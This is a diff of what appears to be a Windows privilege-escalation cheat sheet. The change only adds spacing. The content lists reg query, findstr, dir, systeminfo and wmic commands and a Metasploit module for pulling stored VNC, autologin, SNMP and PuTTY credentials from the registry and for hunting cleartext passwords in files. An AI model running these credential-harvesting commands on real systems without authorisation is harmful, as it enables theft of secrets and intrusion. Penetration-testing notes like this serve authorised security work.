@@ -82,35 +82,52 @@ Under the <UserAccounts> section, you may also see <AdministratorPassword> tags,
   
 3)->Raw passwords in registry
 #vnc
+
 reg query "HKCU\Software\ORL\WinVNC3\Password"
+
 #Windows autologin
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
 #SNMP Paramters
 reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+
 #Putty
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+
 #Search for password in registry
 reg query HKLM /f password /t REG_SZ /s
+
 reg query HKCU /f password /t REG_SZ /s
 
 ---------------------------------------------------------------------------------------------
                                                        
 4)->Identify hotfix or patches
+
 systeminfo
+
 #or
 wmic qfe get Caption,Description,HotFixID,InstalledOn
+
 post/windows/gather/enum_patches (metasploit module)
 
 -----------------------------------------------------------------------------------
 
 5)->searching for cleartext passwords
+
 findstr /si password *.txt
+
 findstr /si password *.xml
+
 findstr /si password *.ini
+
 #Find all those strings in config files.
+
 dir /s *pass* == *cred* == *vnc* == *.config*
+
 #Find all passwords in all files.
+
 findstr /spin "password" *.*
+
 findstr /spin "password" *.*
 
 --------------------------------------------------------------------------------------
